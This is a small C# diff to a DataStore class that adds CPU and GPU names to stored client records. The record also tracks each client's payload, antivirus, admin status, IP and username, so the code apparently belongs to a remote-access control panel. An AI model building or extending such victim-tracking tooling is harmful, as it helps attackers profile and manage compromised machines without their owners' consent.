@@ -71,6 +71,8 @@ public class DataStore
             record.LastPayload   = client.Payload;
             record.LastAntivirus = client.Antivirus;
             record.LastIsAdmin   = client.IsAdmin;
+            if (!string.IsNullOrEmpty(client.CpuName)) record.LastCpuName = client.CpuName;
+            if (!string.IsNullOrEmpty(client.GpuName)) record.LastGpuName = client.GpuName;
             record.LastSeen = DateTime.UtcNow;
             if (client.Port > 0) record.LastPort = client.Port;
             record.ActivityLog.Add(new ActivityEntry { Action = $"Connected from {client.IP} ({client.Username})" });
